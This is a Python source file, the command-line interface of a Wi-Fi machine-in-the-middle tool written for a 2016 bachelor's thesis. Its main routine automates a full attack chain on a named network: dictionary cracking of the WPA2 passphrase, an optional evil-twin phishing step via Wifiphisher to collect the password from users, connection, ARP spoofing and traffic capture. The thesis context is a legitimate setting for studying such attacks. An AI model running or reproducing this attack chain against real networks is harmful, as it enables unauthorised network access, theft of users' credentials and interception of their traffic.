#!/usr/bin/env python3
"""
Wi-Fi Machine-in-the-Middle - command line interface

Automation of MitM Attack on WiFi Networks
Bachelor's Thesis UIFS FIT VUT
Martin Vondracek
2016
"""

import argparse
import logging
import sys
import tempfile
import time
import warnings
from enum import Enum, unique
from typing import BinaryIO
from typing import Optional, Sequence

import coloredlogs

from .access import WirelessUnlocker, WirelessConnecter, list_wifi_interfaces
from .capture import Dumpcap
from .common import WirelessScanner
from .impersonation import Wifiphisher
from .model import WirelessAccessPoint
from .model import WirelessInterface
from .requirements import Requirements, RequirementError, UidRequirement
from .topology import ArpSpoofing
from .wpa2 import verify_psk, PassphraseNotInAnyDictionaryError

__version__ = '0.2'
__author__ = 'Martin Vondracek'
__email__ = 'xvondr20@stud.fit.vutbr.cz'

logger = logging.getLogger(__name__)


@unique
class ExitCode(Enum):
    """
    Return codes.
    Some are inspired by sysexits.h.
    """
    EX_OK = 0
    """Program terminated successfully."""

    ARGUMENTS = 2
    """Incorrect or missing arguments provided."""

    EX_UNAVAILABLE = 69
    """Required program or file does not exist."""

    EX_NOPERM = 77
    """Permission denied."""

    TARGET_AP_NOT_FOUND = 79
    """Target AP was not found during scan."""

    NOT_IN_ANY_DICTIONARY = 80
    """WPA/WPA2 passphrase was not found in any available dictionary."""

    PHISHING_INCORRECT_PSK = 81
    """WPA/WPA2 passphrase obtained from phishing attack is incorrect."""

    SUBPROCESS_ERROR = 82
    """Failure in subprocess occured."""

    KEYBOARD_INTERRUPT = 130
    """Program received SIGINT."""


def main():
    logging.captureWarnings(True)
    warnings.simplefilter('always', ResourceWarning)

    config = Config()
    config.parse_args()
    if config.logging_level:
        coloredlogs.install(level=config.logging_level)
    else:
        logging.disable(logging.CRITICAL)
    logger.info('config parsed from args')
    logger.debug(str(config))

    logger.info('check all requirements')
    try:
        Requirements.check_all()
    except RequirementError as e:
        if isinstance(e.requirement, UidRequirement):
            exitcode = ExitCode.EX_NOPERM
        else:
            exitcode = ExitCode.EX_UNAVAILABLE
        print(e.requirement.msg, file=sys.stderr)
        print('Requirements check failed.')
        config.cleanup()
        return exitcode.value

    # start successful
    print(config.PROGRAM_DESCRIPTION)

    interface = config.interface

    with tempfile.TemporaryDirectory() as tmp_dirname:
        interface.start_monitor_mode()

        scanner = WirelessScanner(tmp_dir=tmp_dirname, interface=interface.name)
        print('scan')
        scan = scanner.scan_once()

        interface.stop_monitor_mode()

        target = None  # type: Optional[WirelessAccessPoint]
        for ap in scan:
            if ap.essid == config.essid:
                target = ap
                print('target found ' + target.essid)
                logger.info('target found ' + target.essid)
                break

        if target:
            print('Attack data @ {}'.format(target.dir_path))

            interface.start_monitor_mode(target.channel)
            wireless_unlocker = WirelessUnlocker(ap=target, monitoring_interface=interface)
            try:
                print('unlocking')
                wireless_unlocker.start()
            except PassphraseNotInAnyDictionaryError:
                print('Passphrase not in any dictionary.')
            finally:
                interface.stop_monitor_mode()

            if not target.is_cracked():
                if config.phishing_enabled:
                    # try phishing attack to catch password from users
                    print('Try to impersonate AP and perform phishing attack.')
                    try:
                        print('start wifiphisher')
                        with Wifiphisher(ap=target, jamming_interface=interface) as wifiphisher:
                            while not wifiphisher.password:
                                wifiphisher.update()
                                if wifiphisher.state == wifiphisher.State.TERMINATED and not wifiphisher.password:
                                    raise Wifiphisher.UnexpectedTerminationError()
                                time.sleep(3)

                            if not verify_psk(target, wifiphisher.password):
                                print('Caught password is not correct.', file=sys.stderr)
                                config.cleanup()
                                return ExitCode.PHISHING_INCORRECT_PSK.value
                    except KeyboardInterrupt:
                        print('stopping')
                        config.cleanup()
                        return ExitCode.KEYBOARD_INTERRUPT.value
                    except Wifiphisher.UnexpectedTerminationError:
                        print('Wifiphisher unexpectedly terminated.', file=sys.stderr)
                        config.cleanup()
                        return ExitCode.SUBPROCESS_ERROR.value
                else:
                    print('Phishing is not enabled and targeted AP is not cracked after previous attacks.\n'
                          'Attack unsuccessful.', file=sys.stderr)
                    config.cleanup()
                    return ExitCode.NOT_IN_ANY_DICTIONARY.value

            print('unlocked')

            # target unlocked, connect to the network

            wireless_connecter = WirelessConnecter(interface=interface)
            print('connecting')
            wireless_connecter.connect(target)
            print('connected')

            # change the network topology

            arp_spoofing = ArpSpoofing(interface=interface)
            print('changing topology of network')
            arp_spoofing.start()
            print('Running until KeyboardInterrupt.')
            try:
                dumpcap = None
                if config.capture_file:
                    dumpcap = Dumpcap(interface=interface, capture_file=config.capture_file)
                    print('capturing')
                try:
                    while True:
                        arp_spoofing.update_state()
                        if dumpcap:
                            dumpcap.update()
                        time.sleep(1)
                finally:
                    if dumpcap:
                        dumpcap.cleanup()
            except KeyboardInterrupt:
                print('stopping')
            arp_spoofing.stop()
            arp_spoofing.clean()
            wireless_connecter.disconnect()
        else:
            print('target AP not found during scan', file=sys.stderr)
            logger.error('target AP not found during scan')
            config.cleanup()
            return ExitCode.TARGET_AP_NOT_FOUND.value

    config.cleanup()
    return ExitCode.EX_OK.value


class Config:
    PROGRAM_NAME = 'wifimitmcli'
    PROGRAM_DESCRIPTION = 'Wi-Fi Machine-in-the-Middle command-line interface'
    LOGGING_LEVELS_DICT = {'debug': logging.DEBUG,
                           'warning': logging.WARNING,
                           'info': logging.INFO,
                           'error': logging.ERROR,
                           'critical': logging.ERROR,
                           'disabled': None,  # logging disabled
                           }
    LOGGING_LEVEL_DEFAULT = 'disabled'

    def __init__(self):
        self.logging_level = None  # type: Optional[int]
        self.phishing_enabled = None  # type: Optional[bool]
        self.capture_file = None  # type: Optional[BinaryIO]
        self.essid = None  # type: Optional[str]
        self.interface = None  # type: Optional[WirelessInterface]

        self.parser = self.init_parser()  # type: argparse.ArgumentParser

    def __str__(self):
        return '<{} logging_level={}, essid={}, interface={!s}>'.format(
            type(self).__name__, logging.getLevelName(self.logging_level), self.essid, self.interface)

    @staticmethod
    def parser_type_wireless_interface(arg: str) -> WirelessInterface:
        """
        Parsers' interface argument conversion and checking.
        :type arg: str
        :param arg: interface argument
        :rtype: WirelessInterface

        Raises:
            argparse.ArgumentTypeError If given name is not a valid interface name.
        """
        try:
            i = WirelessInterface(arg)
        except ValueError:
            raise argparse.ArgumentTypeError('{} is not a valid interface name'.format(arg))
        else:
            logger.debug(str(i))
            return i

    @classmethod
    def init_parser(cls) -> argparse.ArgumentParser:
        """
        Initialize argument parser.
        :rtype: argparse.ArgumentParser
        :return: initialized parser
        """
        parser = argparse.ArgumentParser(
            prog=cls.PROGRAM_NAME,
            description=cls.PROGRAM_DESCRIPTION,
            epilog="Automation of MitM Attack on WiFi Networks, Bachelor's Thesis, UIFS FIT VUT,"
                   " Martin Vondracek, 2016."
        )
        parser.add_argument('-v', '--version', action='version', version='%(prog)s {}'.format(__version__))
        parser.add_argument('-ll', '--logging-level',
                            # NOTE: The type is called before check against choices. In order to display logging level
                            # names as choices, name to level int value conversion cannot be done here. Conversion is
                            # done after parser call in `self.parse_args`.
                            default=cls.LOGGING_LEVEL_DEFAULT,
                            choices=cls.LOGGING_LEVELS_DICT,
                            help='select logging level (default: %(default)s)'
                            )
        parser.add_argument('-p', '--phishing',
                            action='store_true',
                            help='enable phishing attack if dictionary attack fails',
                            )
        parser.add_argument('-cf', '--capture-file',
                            type=argparse.FileType('wb'),
                            help='capture network traffic to provided file',
                            metavar='FILE',
                            )
        parser.add_argument('essid',
                            help='essid of network for attack',
                            metavar='<essid>',
                            )
        parser.add_argument('interface',
                            type=cls.parser_type_wireless_interface,
                            help='wireless network interface for attack',
                            metavar='<interface>',
                            )
        return parser

    def parse_args(self, args: Optional[Sequence[str]] = None):
        """
        Parse command line arguments and store checked and converted values in self.
        `"By default, the argument strings are taken from sys.argv"
            <https://docs.python.org/3/library/argparse.html#argparse.ArgumentParser.parse_args>`_
        :type args: Optional[Sequence[str]]
        :param args: argument strings
        """
        # NOTE: Call to parse_args with namespace=self does not set logging_level with default value, if argument is not
        # in provided args, for some reason.
        parsed_args = self.parser.parse_args(args=args)

        # Check if provided interface name is recognized as wireless interface name.
        for i in list_wifi_interfaces():
            if i.name == parsed_args.interface.name:
                break
        else:
            self.parser.error('argument interface: {} is not recognized as a valid wireless interface'.format(
                parsed_args.interface.name)
            )

        # name to value conversion as noted in `self.init_parser`
        self.logging_level = self.LOGGING_LEVELS_DICT[parsed_args.logging_level]

        self.phishing_enabled = parsed_args.phishing

        if parsed_args.capture_file:
            # `"FileType objects understand the pseudo-argument '-' and automatically convert this into sys.stdin
            # for readable FileType objects and sys.stdout for writable FileType objects:"
            #   <https://docs.python.org/3/library/argparse.html>`_
            if parsed_args.capture_file is sys.stdout:
                self.parser.error('argument -cf/--capture-file: stdout is not allowed')

            # The capture_file is opened by `argparse.ArgumentParser.parse_args` to make sure its writable for us.
            self.capture_file = parsed_args.capture_file

        self.essid = parsed_args.essid
        self.interface = parsed_args.interface

    def cleanup(self):
        if self.capture_file:
            self.capture_file.close()


if __name__ == '__main__':
    status = main()
    sys.exit(status)
